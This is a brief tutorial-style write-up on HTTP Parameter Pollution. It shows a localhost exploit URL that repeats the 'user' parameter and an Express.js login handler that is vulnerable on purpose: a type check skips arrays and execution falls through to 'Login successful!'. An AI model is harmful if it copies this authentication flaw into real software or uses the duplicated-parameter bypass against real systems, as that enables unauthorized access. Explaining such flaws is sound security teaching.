
VULNERABILITY DESCRIPTION
HTTP Parameter Pollution (HPP) is an attack evasion technique that allows an attacker to craft an HTTP request to manipulate or retrieve hidden information.

This technique is based on splitting an attack vector between multiple instances of a parameter with the same name. Since none of the relevant HTTP RFCs define the semantics of HTTP parameter manipulation, each web application delivery platform may deal with it differently.



EXPLOIT
http://localhost:3000/login?user=test&password=123456&user=test2


app.get('/login', (req, res) => {
    let user = req.query.user;
    let password = req.query.password;

    // Security check
    if (user && password && typeof user === 'string' && typeof password === 'string') {
        if (user !== 'admin' || password !== '1234') {
            res.send('Incorrect credentials');
            return;
        } else {
            // Successful login
        }
    }

    // Program follows assuming a successful login
    res.send('Login successful!');
});


In this case works because the developer didn't expecteded req.query.user being an array. He is only check if the parameter is defined and if it's a string.
By duplicating the user HTTP parameter we can bypass the security check
